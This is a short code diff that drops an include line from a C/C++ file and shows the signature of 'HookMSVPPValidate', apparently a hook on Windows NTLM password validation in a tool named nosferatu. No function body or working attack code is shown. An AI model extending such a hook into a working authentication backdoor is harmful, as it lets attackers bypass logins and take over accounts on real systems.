@@ -1,4 +1,3 @@
-#include "pch.h"
 #include "nosferatu.h"
 
 BOOLEAN HookMSVPPValidate(BOOLEAN UasCompatibilityRequired, NETLOGON_LOGON_INFO_CLASS LogonLevel, PVOID LogonInformation, void* Passwords, PULONG UserFlags, PUSER_SESSION_KEY UserSessionKey, PVOID LmSessionKey)
